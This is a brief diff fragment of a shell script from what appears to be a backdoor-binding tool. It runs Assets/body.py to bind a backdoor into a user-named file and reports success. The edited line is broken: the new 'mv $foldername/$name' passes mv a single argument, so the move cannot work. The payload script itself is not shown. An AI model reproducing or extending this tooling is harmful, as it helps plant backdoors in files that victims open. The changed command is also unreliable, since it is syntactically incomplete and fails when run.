@@ -25,7 +25,7 @@ if [ $run = "yes" ]
 then
 export name
 python Assets/body.py
-mv $name $foldername
+mv $foldername/$name
 echo -e "\e[0;32m Backdoor Successfully binded to /$foldername/$name"
 else
 echo -e "\e[0;31m ERR:: Binding error or file/folder does not exist , check the names that you entered and try again "
